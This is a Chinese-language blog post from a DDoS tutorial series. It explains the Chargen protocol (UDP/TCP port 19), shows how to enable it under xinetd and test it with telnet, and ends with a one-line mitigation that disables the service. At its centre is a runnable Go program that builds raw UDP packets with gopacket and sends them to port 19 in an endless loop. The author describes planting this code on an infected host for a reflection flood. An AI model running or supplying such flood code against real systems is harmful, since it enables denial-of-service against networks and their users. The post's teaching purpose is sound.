---
author: Sunny Tsai
title: "[Day 20] 閑的沒事 - Chargen反射攻擊"
date: 2023-10-03
math: true
tags: [
    "cloud",
    "chargen",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# Chargen
字符產生器協定The Character Generator Protocol (Chargen)顧名思義就是會一直發送字元的協定。默認PORT為19/UDP跟19/TCP，初衷是為了測試與診斷網際網路連線，發送方式有TCP跟UDP兩種：
* TCP連線建立後: 伺服器不斷傳送任意的字元到客戶端，直到客戶端關閉連線。
* UDP連線建立後: 每當伺服器收到客戶端的一個UDP數據包，這個數據包中的內容將被丟棄，而伺服器將傳送一個數據包到客戶端，其中包含長度為0～512位元組之間隨機值的任意字元。

## 輸出數據格式
RFC 864沒有規定輸出的具體準確格式。實際操作結果是，輸出每行72個字元，這些字元是ASCII可列印字元，印完了重頭開始繼續。

-----

# 測試
作業系統：Ubuntu
服務：xinetd
修改：把`/etc/xinetd.d/chargen`裡面的`disable`改成`no`
測試：
```shell
> telnet -r localhost 19
```
結果
![](https://imgur.com/SoVM62s.png)


# Code
寫了一個udp範例，模仿chargen服務。只要code不停就不段發送，仿照chargen協議。
```
package main

import (
	"log"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {

	var (
		device      string = "bridge100"
		snapshotLen int32  = 1024
		promiscuous bool   = false
		err         error
		timeout     time.Duration = 10 * time.Second
		handle      *pcap.Handle
		buffer      gopacket.SerializeBuffer
		random      *rand.Rand
	)

	handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	random = rand.New(rand.NewSource(time.Now().UnixNano()))
	srcPort := layers.UDPPort(random.Intn(65535))
	dstPort := layers.UDPPort(19)

	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00},
		DstMAC:       net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00},
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipLayer := &layers.IPv4{
		SrcIP:    net.IP{10, 211, 55, 3},
		DstIP:    net.IP{10, 211, 55, 10},
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
	}

	udpLayer := &layers.UDP{
		SrcPort: srcPort,
		DstPort: dstPort,
	}
	udpLayer.SetNetworkLayerForChecksum(ipLayer)

	// Chargen query
	chargenQuery := []byte("!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{|}")

	payload := chargenQuery

	for {
		buffer = gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		if err := gopacket.SerializeLayers(buffer, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload)); err != nil {
			log.Fatal(err)
		}
		udpPacket := buffer.Bytes()

		err = handle.WritePacketData(udpPacket)
		if err != nil {
			log.Fatal(err)
			os.Exit(1)
		}
	}
}
```

## 反射攻擊
以上code是一段模仿chargen的code，可以放在已被感染的主機上。接下來攻擊者只要發送一段小小的request指引這個被感染的主機不停發送字元。

# 攔截封包
大概長的會是這樣，因為for迴圈是包在udpLayer後面的，所以所有封包都是同一個port發出來
![](https://imgur.com/xUJ5zjE.png)


# 防護
chargen不是常用協議，被利用的話只要把`/etc/xinetd.d/chargen`的`disable`改`yes`就好了
